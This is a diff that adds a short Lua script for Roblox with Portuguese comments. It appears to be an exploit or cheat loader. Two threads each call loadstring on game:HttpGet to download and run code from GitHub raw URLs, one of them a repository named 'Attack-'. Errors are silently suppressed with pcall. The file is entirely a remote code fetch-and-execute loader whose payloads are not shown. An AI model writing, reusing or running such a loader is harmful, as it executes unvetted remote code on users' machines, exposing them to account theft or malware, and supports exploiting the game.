@@ -1,0 +1,13 @@
+-- Executa o primeiro script em uma nova thread
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/AnhDangNhoEm/TuanAnhIOS/refs/heads/main/koby'))()
+    end)
+end)
+
+-- Executa o segundo script
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredztlredz1-droid/Attack-/main/README.md"))()
+    end)
+end)
